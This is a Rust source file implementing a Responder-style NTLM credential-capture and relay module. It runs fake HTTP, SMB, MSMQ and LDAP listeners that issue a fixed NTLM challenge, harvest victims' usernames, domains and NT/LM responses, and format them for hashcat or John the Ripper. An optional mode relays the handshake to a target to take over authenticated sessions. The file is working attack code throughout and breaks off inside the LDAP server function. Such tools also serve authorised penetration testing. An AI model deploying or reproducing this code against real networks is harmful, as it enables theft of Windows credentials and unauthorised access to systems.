//! Responder Module
//!
//! Implements credential capture via fake services
//! (SMB, HTTP, LDAP, MSMQ) by listening for NTLM
//! authentication attempts and extracting credentials.

use crate::{RelayError, Result};
use std::collections::HashMap;
use std::io::{Read, Write};
use std::net::{TcpListener, TcpStream};
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, Ordering};
use std::thread;
use std::time::Duration;
use tokio::runtime::Handle;
use tokio::sync::Mutex as TokioMutex;
use tracing::{debug, error, info, warn};

// ===========================================================
// NTLM Protocol Constants
// ===========================================================

/// NTLM signature: "NTLMSSP\0"
const NTLM_SIGNATURE: &[u8; 8] = b"NTLMSSP\x00";

/// NTLM message types
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum NtlmMessageType {
    /// `` variant
    Negotiate = 1,
    /// `` variant
    Challenge = 2,
    /// `` variant
    Authenticate = 3,
}

/// Parse NTLM message type from raw bytes
fn parse_ntlm_type(data: &[u8]) -> Option<NtlmMessageType> {
    if data.len() < 12 {
        return None;
    }
    if &data[0..8] != NTLM_SIGNATURE {
        return None;
    }
    match u32::from_le_bytes([data[8], data[9], data[10], data[11]]) {
        1 => Some(NtlmMessageType::Negotiate),
        2 => Some(NtlmMessageType::Challenge),
        3 => Some(NtlmMessageType::Authenticate),
        _ => None,
    }
}

// ===========================================================
// NTLM Message Parsing
// ===========================================================

/// Parsed NTLM Negotiate message
#[derive(Debug, Clone)]
pub struct NtlmNegotiate {
    /// flags field
    pub flags: u32,
    /// Domain FQDN
    pub domain: Option<String>,
    /// workstation field
    pub workstation: Option<String>,
}

/// Parsed NTLM Authenticate message  
#[derive(Debug, Clone)]
pub struct NtlmAuthenticate {
    /// LM response data
    pub lm_response: Vec<u8>,
    /// NT response data
    pub nt_response: Vec<u8>,
    /// Domain FQDN
    pub domain: String,
    /// Username for authentication
    pub username: String,
    /// workstation field
    pub workstation: String,
    /// Key data
    pub session_key: Option<Vec<u8>>,
}

/// Parse NTLM Negotiate message
fn _parse_ntlm_negotiate(data: &[u8]) -> Option<NtlmNegotiate> {
    if data.len() < 16 {
        return None;
    }

    let flags = u32::from_le_bytes([data[12], data[13], data[14], data[15]]);

    // Extract domain if present (offset 16)
    let domain = if data.len() > 32 {
        let domain_len = u16::from_le_bytes([data[16], data[17]]) as usize;
        let domain_offset = u32::from_le_bytes([data[20], data[21], data[22], data[23]]) as usize;
        if domain_len > 0 && domain_offset + domain_len <= data.len() {
            Some(
                String::from_utf8_lossy(&data[domain_offset..domain_offset + domain_len])
                    .to_string(),
            )
        } else {
            None
        }
    } else {
        None
    };

    Some(NtlmNegotiate {
        flags,
        domain,
        workstation: None,
    })
}

/// Parse NTLM Authenticate message to extract credentials
fn parse_ntlm_authenticate(data: &[u8]) -> Option<NtlmAuthenticate> {
    if data.len() < 64 {
        return None;
    }

    // Helper to extract a field from NTLM authenticate message
    fn extract_field(data: &[u8], offset: usize) -> Option<Vec<u8>> {
        let len = u16::from_le_bytes([data[offset], data[offset + 1]]) as usize;
        let alloc_len = u16::from_le_bytes([data[offset + 2], data[offset + 3]]) as usize;
        let buffer_offset = u32::from_le_bytes([
            data[offset + 4],
            data[offset + 5],
            data[offset + 6],
            data[offset + 7],
        ]) as usize;

        if len == 0 && alloc_len == 0 {
            return Some(Vec::new());
        }

        let actual_len = if len > 0 { len } else { alloc_len };
        if buffer_offset + actual_len <= data.len() {
            Some(data[buffer_offset..buffer_offset + actual_len].to_vec())
        } else {
            None
        }
    }

    // Field offsets in NTLM Authenticate message
    // LM Response: offset 12
    // NT Response: offset 20
    // Domain: offset 28
    // Username: offset 36
    // Workstation: offset 44
    // Session Key: offset 52

    let lm_response = extract_field(data, 12)?;
    let nt_response = extract_field(data, 20)?;
    let domain_bytes = extract_field(data, 28)?;
    let username_bytes = extract_field(data, 36)?;
    let workstation_bytes = extract_field(data, 44)?;

    // Convert from UTF-16LE to String
    let domain = decode_utf16le(&domain_bytes);
    let username = decode_utf16le(&username_bytes);
    let workstation = decode_utf16le(&workstation_bytes);

    Some(NtlmAuthenticate {
        lm_response,
        nt_response,
        domain,
        username,
        workstation,
        session_key: None,
    })
}

/// Decode UTF-16LE bytes to String
fn decode_utf16le(data: &[u8]) -> String {
    if data.is_empty() {
        return String::new();
    }

    let chars: Vec<u16> = data
        .chunks_exact(2)
        .map(|chunk| u16::from_le_bytes([chunk[0], chunk[1]]))
        .collect();

    String::from_utf16_lossy(&chars)
}

/// Build NTLM Challenge message
fn build_ntlm_challenge(challenge: [u8; 8], target_name: &str) -> Vec<u8> {
    let mut msg = Vec::new();

    // Signature
    msg.extend_from_slice(NTLM_SIGNATURE);

    // Message type (Challenge = 2)
    msg.extend_from_slice(&2u32.to_le_bytes());

    // Target name fields (offset 12)
    let target_bytes = target_name
        .encode_utf16()
        .flat_map(|c| c.to_le_bytes())
        .collect::<Vec<u8>>();
    msg.extend_from_slice(&(target_bytes.len() as u16).to_le_bytes()); // Len
    msg.extend_from_slice(&(target_bytes.len() as u16).to_le_bytes()); // Max len
    msg.extend_from_slice(&12u32.to_le_bytes()); // Buffer offset (right after this header)

    // Negotiate flags
    // NTLMSSP_NEGOTIATE_UNICODE | NTLMSSP_NEGOTIATE_NTLM | NTLMSSP_TARGET_TYPE_DOMAIN
    let flags: u32 = 0x00000202 | 0x00020000 | 0x00010000;
    msg.extend_from_slice(&flags.to_le_bytes());

    // Server challenge (8 bytes)
    msg.extend_from_slice(&challenge);

    // Reserved (8 bytes)
    msg.extend_from_slice(&[0u8; 8]);

    // Target info (empty for now)
    msg.extend_from_slice(&0u16.to_le_bytes()); // Len
    msg.extend_from_slice(&0u16.to_le_bytes()); // Max len
    msg.extend_from_slice(&0u32.to_le_bytes()); // Offset

    // Target name data
    msg.extend_from_slice(&target_bytes);

    msg
}

// ===========================================================
// HTTP NTLM Authentication
// ===========================================================

/// Parse NTLM token from HTTP Authorization header
fn parse_http_auth_header(header: &str) -> Option<Vec<u8>> {
    let header = header.trim();
    if !header.starts_with("NTLM ") {
        return None;
    }
    let b64 = &header[5..];
    base64_decode(b64)
}

/// Base64 decode
fn base64_decode(data: &str) -> Option<Vec<u8>> {
    use base64::{Engine, engine::general_purpose::STANDARD};
    STANDARD.decode(data).ok()
}

/// Base64 encode
fn base64_encode(data: &[u8]) -> String {
    use base64::{Engine, engine::general_purpose::STANDARD};
    STANDARD.encode(data)
}

// ===========================================================
// Responder Configuration
// ===========================================================

/// Responder configuration
#[derive(Debug, Clone)]
pub struct ResponderConfig {
    /// IP address to listen on
    pub listen_ip: String,
    /// Fixed challenge to use (hex string, e.g., "1122334455667788")
    pub challenge: Option<String>,
    /// Enable HTTP server
    pub http: bool,
    /// Enable SMB server
    pub smb: bool,
    /// Enable LDAP server
    pub ldap: bool,
    /// Enable MSMQ server (port 1801)
    pub msmq: bool,
}

impl Default for ResponderConfig {
    fn default() -> Self {
        Self {
            listen_ip: "::".to_string(),
            challenge: Some("1122334455667788".to_string()),
            http: true,
            smb: true,
            ldap: false,
            msmq: false,
        }
    }
}

/// Captured credential
#[derive(Debug, Clone)]
pub struct CapturedCredential {
    /// Client IP address
    pub client_ip: String,
    /// Username extracted from NTLM
    pub username: String,
    /// Domain extracted from NTLM
    pub domain: String,
    /// Server challenge (hex)
    pub challenge: String,
    /// LM response (hex)
    pub lm_response: String,
    /// NT response (hex)
    pub nt_response: String,
    /// Protocol used (HTTP, SMB, LDAP, MSMQ)
    pub protocol: String,
    /// Timestamp
    pub timestamp: chrono::DateTime<chrono::Utc>,
}

impl CapturedCredential {
    /// Format as hashcat format (username::domain:challenge:lm_response:nt_response)
    pub fn to_hashcat_format(&self) -> String {
        format!(
            "{}::{}:{}:{}:{}",
            self.username, self.domain, self.challenge, self.lm_response, self.nt_response
        )
    }

    /// Format as John the Ripper format
    pub fn to_john_format(&self) -> String {
        self.to_hashcat_format()
    }
}

// ===========================================================
// Responder Implementation
// ===========================================================

/// Type alias for the thread-safe map of pending relay sessions keyed by client IP.
type PendingRelays = Arc<std::sync::Mutex<HashMap<String, (u64, Vec<u8>)>>>;

/// Bridge between synchronous responder threads and the async NtlmRelay engine.
#[derive(Clone)]
struct RelayBridge {
    relay: Arc<TokioMutex<crate::relay::NtlmRelay>>,
    handle: Handle,
}

/// Responder for credential capture and NTLM relay
pub struct Responder {
    config: ResponderConfig,
    running: Arc<AtomicBool>,
    captured: Arc<std::sync::Mutex<Vec<CapturedCredential>>>,
    threads: Vec<thread::JoinHandle<()>>,
    /// Optional relay bridge -- when set, the HTTP responder relays
    /// NTLM tokens through the async relay engine instead of capturing them.
    relay: Option<RelayBridge>,
    /// Maps client IP -> (relay_id, target_challenge) for session continuity
    /// across NTLM's three-step handshake over separate TCP connections.
    /// The challenge bytes are stored so we can include them in hash harvesting.
    pending_relays: PendingRelays,
}

impl Responder {
    /// Create a new responder with the given configuration
    pub fn new(config: ResponderConfig) -> Self {
        Self {
            config,
            running: Arc::new(AtomicBool::new(false)),
            captured: Arc::new(std::sync::Mutex::new(Vec::new())),
            threads: Vec::new(),
            relay: None,
            pending_relays: Arc::new(std::sync::Mutex::new(HashMap::new())) as PendingRelays,
        }
    }

    /// Attach an async relay engine to this responder.
    /// When set, the HTTP responder will forward NTLM Negotiate/Authenticate
    /// through the relay instead of capturing credentials locally.
    /// The `handle` must be a handle to the tokio runtime where the relay runs.
    pub fn set_relay(&mut self, relay: Arc<TokioMutex<crate::relay::NtlmRelay>>, handle: Handle) {
        self.relay = Some(RelayBridge { relay, handle });
    }

    /// Start the responder
    pub async fn start(&mut self) -> Result<()> {
        if self.running.load(Ordering::SeqCst) {
            return Err(RelayError::Config("Responder already running".to_string()).into());
        }

        info!(
            "Starting responder on {} (HTTP: {}, SMB: {}, LDAP: {}, MSMQ: {})",
            self.config.listen_ip,
            self.config.http,
            self.config.smb,
            self.config.ldap,
            self.config.msmq
        );

        self.running.store(true, Ordering::SeqCst);

        // Start HTTP server
        if self.config.http {
            let running = Arc::clone(&self.running);
            let listen_ip = self.config.listen_ip.clone();
            let challenge = self
                .config
                .challenge
                .clone()
                .unwrap_or_else(|| "1122334455667788".to_string());
            let captured = Arc::clone(&self.captured);
            let relay = self.relay.clone();
            let pending_relays = Arc::clone(&self.pending_relays);

            let handle = thread::spawn(move || {
                if let Err(e) = Self::run_http_server(
                    running,
                    &listen_ip,
                    &challenge,
                    captured,
                    relay,
                    pending_relays,
                ) {
                    error!("HTTP server error: {}", e);
                }
            });
            self.threads.push(handle);
        }

        // Start MSMQ server
        if self.config.msmq {
            let running = Arc::clone(&self.running);
            let listen_ip = self.config.listen_ip.clone();
            let challenge = self
                .config
                .challenge
                .clone()
                .unwrap_or_else(|| "1122334455667788".to_string());
            let captured = Arc::clone(&self.captured);

            let handle = thread::spawn(move || {
                if let Err(e) = Self::run_msmq_server(running, &listen_ip, &challenge, captured) {
                    error!("MSMQ server error: {}", e);
                }
            });
            self.threads.push(handle);
        }

        // Start LDAP server
        if self.config.ldap {
            let running = Arc::clone(&self.running);
            let listen_ip = self.config.listen_ip.clone();
            let challenge = self
                .config
                .challenge
                .clone()
                .unwrap_or_else(|| "1122334455667788".to_string());
            let captured = Arc::clone(&self.captured);

            let handle = thread::spawn(move || {
                if let Err(e) = Self::run_ldap_server(running, &listen_ip, &challenge, captured) {
                    error!("LDAP server error: {}", e);
                }
            });
            self.threads.push(handle);
        }

        // Start SMB server
        if self.config.smb {
            let running = Arc::clone(&self.running);
            let listen_ip = self.config.listen_ip.clone();
            let challenge = self
                .config
                .challenge
                .clone()
                .unwrap_or_else(|| "1122334455667788".to_string());
            let captured = Arc::clone(&self.captured);

            let handle = thread::spawn(move || {
                if let Err(e) = Self::run_smb_server(running, &listen_ip, &challenge, captured) {
                    error!("SMB server error: {}", e);
                }
            });
            self.threads.push(handle);
        }

        info!("Responder started successfully");
        Ok(())
    }

    /// Stop the responder
    pub async fn stop(&mut self) -> Result<()> {
        if !self.running.load(Ordering::SeqCst) {
            return Ok(());
        }

        info!("Stopping responder");
        self.running.store(false, Ordering::SeqCst);

        for handle in self.threads.drain(..) {
            let _ = handle.join();
        }

        info!("Responder stopped");
        Ok(())
    }

    /// Get captured credentials
    pub fn get_captured_credentials(&self) -> Vec<CapturedCredential> {
        self.captured
            .lock()
            .unwrap_or_else(|e| {
                warn!("Mutex poisoned in Responder -- recovering data");
                e.into_inner()
            })
            .clone()
    }

    /// Check if responder is running
    pub fn is_running(&self) -> bool {
        self.running.load(Ordering::SeqCst)
    }

    /// Get configuration
    pub fn config(&self) -> &ResponderConfig {
        &self.config
    }

    // =======================================================
    // HTTP Server Implementation
    // =======================================================

    fn run_http_server(
        running: Arc<AtomicBool>,
        listen_ip: &str,
        challenge: &str,
        captured: Arc<std::sync::Mutex<Vec<CapturedCredential>>>,
        relay: Option<RelayBridge>,
        pending_relays: PendingRelays,
    ) -> Result<()> {
        let addr = crate::utils::format_addr(listen_ip, 80);
        let listener = TcpListener::bind(&addr)
            .map_err(|e| RelayError::Socket(format!("Failed to bind HTTP port 80: {}", e)))?;

        listener
            .set_nonblocking(true)
            .map_err(|e| RelayError::Socket(format!("Failed to set nonblocking: {}", e)))?;

        info!("HTTP server listening on {}", addr);

        let challenge_bytes =
            hex_str_to_bytes(challenge).unwrap_or([0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88]);

        while running.load(Ordering::SeqCst) {
            match listener.accept() {
                Ok((stream, peer)) => {
                    debug!("HTTP connection from {}", peer);
                    if let Err(e) = Self::handle_http_client(
                        stream,
                        peer.ip().to_string(),
                        challenge_bytes,
                        &captured,
                        &relay,
                        &pending_relays,
                    ) {
                        debug!("HTTP client handling error: {}", e);
                    }
                }
                Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                    thread::sleep(Duration::from_millis(100));
                    continue;
                }
                Err(e) => {
                    warn!("HTTP accept error: {}", e);
                }
            }
        }

        info!("HTTP server stopped");
        Ok(())
    }

    fn handle_http_client(
        mut stream: TcpStream,
        client_ip: String,
        challenge: [u8; 8],
        captured: &Arc<std::sync::Mutex<Vec<CapturedCredential>>>,
        relay: &Option<RelayBridge>,
        pending_relays: &PendingRelays,
    ) -> Result<()> {
        stream.set_read_timeout(Some(Duration::from_secs(5))).ok();
        stream.set_write_timeout(Some(Duration::from_secs(5))).ok();

        let mut request = vec![0u8; 4096];
        let len = stream
            .read(&mut request)
            .map_err(|e| RelayError::Network(format!("HTTP read error: {}", e)))?;
        let request = &request[..len];
        let request_str = String::from_utf8_lossy(request);

        // Check for Authorization header
        if let Some(auth_line) = request_str
            .lines()
            .find(|l| l.starts_with("Authorization:"))
            && let Some(ntlm_data) =
                parse_http_auth_header(auth_line.trim_start_matches("Authorization:"))
        {
            match parse_ntlm_type(&ntlm_data) {
                Some(NtlmMessageType::Negotiate) => {
                    if let Some(bridge) = relay {
                        // --- RELAY MODE: forward Negotiate to target via relay engine ---
                        let ntlm_owned = ntlm_data.to_vec();
                        let bridge = bridge.clone();
                        let result = bridge.handle.block_on(async move {
                            let mut relay = bridge.relay.lock().await;
                            relay.relay_negotiate(&ntlm_owned).await
                        });

                        match result {
                            Ok((relay_id, target_challenge)) => {
                                // Store relay_id + challenge by client IP for the Authenticate step
                                pending_relays
                                    .lock()
                                    .unwrap_or_else(|e| {
                                        warn!("Mutex poisoned in Responder -- recovering data");
                                        e.into_inner()
                                    })
                                    .insert(
                                        client_ip.clone(),
                                        (relay_id, target_challenge.clone()),
                                    );

                                // Send the target's challenge back to victim
                                let b64_challenge = base64_encode(&target_challenge);
                                let response = format!(
                                    "HTTP/1.1 401 Unauthorized\r\n\
                                         WWW-Authenticate: NTLM {}\r\n\
                                         Content-Length: 0\r\n\
                                         Connection: close\r\n\
                                         \r\n",
                                    b64_challenge
                                );
                                stream.write_all(response.as_bytes()).ok();
                                info!(
                                    "Relayed NTLM Negotiate to target (relay_id={}) from {}",
                                    relay_id, client_ip
                                );
                            }
                            Err(e) => {
                                warn!("Relay negotiate failed for {}: {}", client_ip, e);
                                let response = "HTTP/1.1 401 Unauthorized\r\nContent-Length: 0\r\nConnection: close\r\n\r\n";
                                stream.write_all(response.as_bytes()).ok();
                            }
                        }
                    } else {
                        // --- CAPTURE MODE: send fixed challenge ---
                        let challenge_msg = build_ntlm_challenge(challenge, "DOMAIN");
                        let b64_challenge = base64_encode(&challenge_msg);

                        let response = format!(
                            "HTTP/1.1 401 Unauthorized\r\n\
                                 WWW-Authenticate: NTLM {}\r\n\
                                 Content-Length: 0\r\n\
                                 Connection: close\r\n\
                                 \r\n",
                            b64_challenge
                        );
                        stream.write_all(response.as_bytes()).ok();
                    }
                    return Ok(());
                }
                Some(NtlmMessageType::Authenticate) => {
                    if let Some(bridge) = relay {
                        // --- RELAY MODE: forward Authenticate to target ---
                        let pending = pending_relays
                            .lock()
                            .unwrap_or_else(|e| {
                                warn!("Mutex poisoned in Responder -- recovering data");
                                e.into_inner()
                            })
                            .remove(&client_ip);

                        match pending {
                            Some((relay_id, challenge_bytes)) => {
                                let ntlm_owned = ntlm_data.to_vec();
                                let bridge = bridge.clone();
                                let result = bridge.handle.block_on(async move {
                                    let mut relay = bridge.relay.lock().await;
                                    relay.relay_authenticate(relay_id, &ntlm_owned).await
                                });

                                match result {
                                    Ok(session) => {
                                        info!(
                                            "HTTP->SMB relay succeeded: {}\\{} (target: {})",
                                            session.username,
                                            session.domain,
                                            session.target.address
                                        );

                                        // Also capture the credential for hash harvesting
                                        if let Ok(Some(auth)) = std::panic::catch_unwind(|| {
                                            parse_ntlm_authenticate(&ntlm_data)
                                        }) {
                                            let cred = CapturedCredential {
                                                client_ip,
                                                username: auth.username,
                                                domain: auth.domain,
                                                challenge: bytes_to_hex(&challenge_bytes[24..32]),
                                                lm_response: bytes_to_hex(&auth.lm_response),
                                                nt_response: bytes_to_hex(&auth.nt_response),
                                                protocol: "HTTP->SMB".to_string(),
                                                timestamp: chrono::Utc::now(),
                                            };
                                            captured
                                                .lock()
                                                .unwrap_or_else(|e| {
                                                    warn!(
                                                        "Mutex poisoned in Responder -- recovering data"
                                                    );
                                                    e.into_inner()
                                                })
                                                .push(cred);
                                        }

                                        let response = "HTTP/1.1 200 OK\r\nContent-Length: 0\r\nConnection: close\r\n\r\n";
                                        stream.write_all(response.as_bytes()).ok();
                                    }
                                    Err(e) => {
                                        warn!(
                                            "Relay authenticate failed for {} (relay_id={}): {}",
                                            client_ip, relay_id, e
                                        );
                                        let response = "HTTP/1.1 401 Unauthorized\r\nContent-Length: 0\r\nConnection: close\r\n\r\n";
                                        stream.write_all(response.as_bytes()).ok();
                                    }
                                }
                            }
                            None => {
                                warn!(
                                    "No pending relay for {} -- sending initial challenge",
                                    client_ip
                                );
                                // Fall back to capture mode challenge
                                let challenge_msg = build_ntlm_challenge(challenge, "DOMAIN");
                                let b64_challenge = base64_encode(&challenge_msg);
                                let response = format!(
                                    "HTTP/1.1 401 Unauthorized\r\n\
                                         WWW-Authenticate: NTLM {}\r\n\
                                         Content-Length: 0\r\n\
                                         Connection: close\r\n\
                                         \r\n",
                                    b64_challenge
                                );
                                stream.write_all(response.as_bytes()).ok();
                            }
                        }
                    } else {
                        // --- CAPTURE MODE: extract and store credentials ---
                        if let Some(auth) = parse_ntlm_authenticate(&ntlm_data) {
                            let cred = CapturedCredential {
                                client_ip,
                                username: auth.username,
                                domain: auth.domain,
                                challenge: bytes_to_hex(&challenge),
                                lm_response: bytes_to_hex(&auth.lm_response),
                                nt_response: bytes_to_hex(&auth.nt_response),
                                protocol: "HTTP".to_string(),
                                timestamp: chrono::Utc::now(),
                            };

                            info!(
                                "Captured NTLM credentials: {}\\{} via HTTP",
                                cred.domain, cred.username
                            );

                            captured
                                .lock()
                                .unwrap_or_else(|e| {
                                    warn!("Mutex poisoned in Responder -- recovering data");
                                    e.into_inner()
                                })
                                .push(cred);
                        }

                        // Send final response
                        let response =
                            "HTTP/1.1 200 OK\r\nContent-Length: 0\r\nConnection: close\r\n\r\n";
                        stream.write_all(response.as_bytes()).ok();
                    }
                    return Ok(());
                }
                _ => {}
            }
        }

        // No NTLM auth header -- request authentication
        let response = "HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: NTLM\r\nContent-Length: 0\r\nConnection: close\r\n\r\n";
        stream.write_all(response.as_bytes()).ok();

        Ok(())
    }

    // =======================================================
    // SMB Server Implementation
    // =======================================================

    fn run_smb_server(
        running: Arc<AtomicBool>,
        listen_ip: &str,
        challenge: &str,
        captured: Arc<std::sync::Mutex<Vec<CapturedCredential>>>,
    ) -> Result<()> {
        let addr = crate::utils::format_addr(listen_ip, 445);
        let listener = TcpListener::bind(&addr)
            .map_err(|e| RelayError::Socket(format!("Failed to bind SMB port 445: {}", e)))?;

        listener
            .set_nonblocking(true)
            .map_err(|e| RelayError::Socket(format!("Failed to set nonblocking: {}", e)))?;

        info!("SMB server listening on {}", addr);

        let challenge_bytes =
            hex_str_to_bytes(challenge).unwrap_or([0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88]);

        while running.load(Ordering::SeqCst) {
            match listener.accept() {
                Ok((stream, peer)) => {
                    debug!("SMB connection from {}", peer);
                    if let Err(e) = Self::handle_smb_client(
                        stream,
                        peer.ip().to_string(),
                        challenge_bytes,
                        &captured,
                    ) {
                        debug!("SMB client handling error: {}", e);
                    }
                }
                Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                    thread::sleep(Duration::from_millis(100));
                    continue;
                }
                Err(e) => {
                    warn!("SMB accept error: {}", e);
                }
            }
        }

        info!("SMB server stopped");
        Ok(())
    }

    fn handle_smb_client(
        mut stream: TcpStream,
        client_ip: String,
        challenge: [u8; 8],
        captured: &Arc<std::sync::Mutex<Vec<CapturedCredential>>>,
    ) -> Result<()> {
        stream.set_read_timeout(Some(Duration::from_secs(5))).ok();
        stream.set_write_timeout(Some(Duration::from_secs(5))).ok();

        let mut buf = vec![0u8; 8192];

        // Read SMB negotiate
        let len = stream
            .read(&mut buf)
            .map_err(|e| RelayError::Network(format!("SMB read error: {}", e)))?;

        if len < 4 {
            return Err(RelayError::Protocol(format!(
                "SMB message too short: got {} bytes, expected at least 4",
                len
            ))
            .into());
        }

        // Check for NetBIOS header
        let _netbios_len = ((buf[1] as usize) << 16) | ((buf[2] as usize) << 8) | (buf[3] as usize);

        // Check for SMB1 or SMB2 magic
        if &buf[4..8] == b"\xffSMB" {
            // SMB1 - send NTLM challenge
            debug!("SMB1 connection detected");
        } else if &buf[4..8] == b"\xfeSMB" {
            // SMB2
            debug!("SMB2 connection detected");
        }

        // Send SMB negotiate response with NTLM challenge
        let negotiate_response = Self::build_smb_negotiate_response(challenge);
        stream
            .write_all(&negotiate_response)
            .map_err(|e| RelayError::Network(format!("SMB write error: {}", e)))?;

        // Read session setup with NTLM authenticate
        let len = stream
            .read(&mut buf)
            .map_err(|e| RelayError::Network(format!("SMB read error: {}", e)))?;

        // Extract NTLM authenticate from SMB message
        if let Some(ntlm_data) = Self::extract_ntlm_from_smb(&buf[..len])
            && let Some(auth) = parse_ntlm_authenticate(&ntlm_data)
        {
            let cred = CapturedCredential {
                client_ip,
                username: auth.username,
                domain: auth.domain,
                challenge: bytes_to_hex(&challenge),
                lm_response: bytes_to_hex(&auth.lm_response),
                nt_response: bytes_to_hex(&auth.nt_response),
                protocol: "SMB".to_string(),
                timestamp: chrono::Utc::now(),
            };

            info!(
                "Captured NTLM credentials: {}\\{} via SMB",
                cred.domain, cred.username
            );

            captured
                .lock()
                .unwrap_or_else(|e| {
                    warn!("Mutex poisoned in Responder -- recovering data");
                    e.into_inner()
                })
                .push(cred);
        }
        Ok(())
    }

    fn build_smb_negotiate_response(challenge: [u8; 8]) -> Vec<u8> {
        let mut response = Vec::new();

        // NetBIOS header
        response.push(0x00); // Message type

        // SMB2 negotiate response header
        response.extend_from_slice(b"\xfeSMB"); // SMB2 magic
        response.extend_from_slice(&0x40u16.to_le_bytes()); // Header length
        response.extend_from_slice(&0x0011u16.to_le_bytes()); // Credit charge
        response.extend_from_slice(&0u32.to_le_bytes()); // Status
        response.extend_from_slice(&0x0001u16.to_le_bytes()); // Command (NEGOTIATE)
        response.extend_from_slice(&0u16.to_le_bytes()); // Credits
        response.extend_from_slice(&0u32.to_le_bytes()); // Flags
        response.extend_from_slice(&0u32.to_le_bytes()); // Next command
        response.extend_from_slice(&[0u8; 16]); // Message ID
        response.extend_from_slice(&0u32.to_le_bytes()); // Process ID
        response.extend_from_slice(&0u32.to_le_bytes()); // Tree ID
        response.extend_from_slice(&[0u8; 16]); // Session ID
        response.extend_from_slice(&[0u8; 16]); // Signature

        // Security buffer with NTLM challenge
        let ntlm_challenge = build_ntlm_challenge(challenge, "DOMAIN");

        // Security buffer offset and length
        response.extend_from_slice(&(ntlm_challenge.len() as u16).to_le_bytes());
        response.extend_from_slice(&80u16.to_le_bytes()); // Offset

        response.extend_from_slice(&ntlm_challenge);

        // Update NetBIOS length
        let len = response.len() - 4;
        let mut netbios_header = vec![0u8; 4];
        netbios_header[1] = ((len >> 16) & 0xFF) as u8;
        netbios_header[2] = ((len >> 8) & 0xFF) as u8;
        netbios_header[3] = (len & 0xFF) as u8;

        [netbios_header, response].concat()
    }

    fn extract_ntlm_from_smb(data: &[u8]) -> Option<Vec<u8>> {
        // Find NTLMSSP signature in SMB message
        for i in 0..data.len().saturating_sub(8) {
            if &data[i..i + 8] == NTLM_SIGNATURE {
                // Found NTLM message, try to determine length
                if let Some(msg_type) = parse_ntlm_type(&data[i..])
                    && msg_type == NtlmMessageType::Authenticate
                {
                    // The authenticate message should be followed by data
                    // We need to read until we have the full message
                    // For simplicity, just return what we have
                    return Some(data[i..].to_vec());
                }
            }
        }
        None
    }
}

impl Drop for Responder {
    fn drop(&mut self) {
        self.running.store(false, Ordering::SeqCst);
    }
}

impl Responder {
    // =======================================================
    // MSMQ Server
    // =======================================================

    fn run_msmq_server(
        running: Arc<AtomicBool>,
        listen_ip: &str,
        challenge: &str,
        captured: Arc<std::sync::Mutex<Vec<CapturedCredential>>>,
    ) -> Result<()> {
        let addr = crate::utils::format_addr(listen_ip, 1801);
        let listener = TcpListener::bind(&addr)
            .map_err(|e| RelayError::Socket(format!("Failed to bind MSMQ port 1801: {}", e)))?;

        listener
            .set_nonblocking(true)
            .map_err(|e| RelayError::Socket(format!("Failed to set nonblocking: {}", e)))?;

        info!("MSMQ server listening on {}", addr);

        let challenge_bytes =
            hex_str_to_bytes(challenge).unwrap_or([0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88]);

        while running.load(Ordering::SeqCst) {
            match listener.accept() {
                Ok((stream, peer)) => {
                    debug!("MSMQ connection from {}", peer);
                    if let Err(e) = Self::handle_msmq_client(
                        stream,
                        peer.ip().to_string(),
                        challenge_bytes,
                        &captured,
                    ) {
                        debug!("MSMQ client handling error: {}", e);
                    }
                }
                Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                    thread::sleep(Duration::from_millis(100));
                    continue;
                }
                Err(e) => {
                    warn!("MSMQ accept error: {}", e);
                }
            }
        }

        info!("MSMQ server stopped");
        Ok(())
    }

    fn handle_msmq_client(
        mut stream: TcpStream,
        client_ip: String,
        challenge: [u8; 8],
        captured: &Arc<std::sync::Mutex<Vec<CapturedCredential>>>,
    ) -> Result<()> {
        stream.set_read_timeout(Some(Duration::from_secs(10))).ok();
        stream.set_write_timeout(Some(Duration::from_secs(10))).ok();

        let mut buf = vec![0u8; 65536];
        let len = stream
            .read(&mut buf)
            .map_err(|e| RelayError::Network(format!("MSMQ read error: {}", e)))?;

        if len < 24 || buf[2] != 11 {
            // Not an RPC bind PDU
            return Err(RelayError::Protocol("Expected RPC bind PDU".into()).into());
        }

        // Extract NTLM negotiate from auth trailer
        let negotiate = extract_msmq_ntlm_token(&buf[..len]);
        if negotiate.is_none() {
            debug!("MSMQ: no NTLM token in RPC bind, sending auth challenge response");
        }

        // Build RPC bind_ack with NTLM challenge
        let challenge_msg = build_ntlm_challenge(challenge, "MSMQ");
        let ack_pdu = build_rpc_bind_ack(&challenge_msg, 0);

        stream
            .write_all(&ack_pdu)
            .map_err(|e| RelayError::Network(format!("MSMQ bind_ack write: {}", e)))?;

        // Read second message (RPC request with NTLM authenticate)
        let mut buf2 = vec![0u8; 65536];
        let len2 = stream
            .read(&mut buf2)
            .map_err(|e| RelayError::Network(format!("MSMQ second read: {}", e)))?;

        if len2 > 0
            && let Some(auth_data) = extract_msmq_ntlm_token(&buf2[..len2])
            && auth_data.len() >= 12
            && &auth_data[0..8] == NTLM_SIGNATURE
            && u32::from_le_bytes([auth_data[8], auth_data[9], auth_data[10], auth_data[11]]) == 3
        {
            // Parse NTLM authenticate and capture
            if let Some(parsed) = parse_ntlm_authenticate(&auth_data) {
                let cred = CapturedCredential {
                    client_ip,
                    username: parsed.username,
                    domain: parsed.domain,
                    challenge: bytes_to_hex(&challenge),
                    lm_response: bytes_to_hex(&parsed.lm_response),
                    nt_response: bytes_to_hex(&parsed.nt_response),
                    protocol: "MSMQ".to_string(),
                    timestamp: chrono::Utc::now(),
                };

                info!(
                    "Captured NTLM credentials: {}\\{} via MSMQ",
                    cred.domain, cred.username
                );

                captured
                    .lock()
                    .unwrap_or_else(|e| {
                        warn!("Mutex poisoned in Responder -- recovering data");
                        e.into_inner()
                    })
                    .push(cred);
            }
        }

        Ok(())
    }

    // =======================================================
    // LDAP Server (NTLM capture via LDAP SASL bind)
    // =======================================================

    fn run_ldap_server(
        running: Arc<AtomicBool>,
        listen_ip: &str,
        challenge: &str,
        captured: Arc<std::sync::Mutex<Vec<CapturedCredential>>>,
    ) -> Result<()> {
        let addr = crate::utils::format_addr(listen_ip, 389);
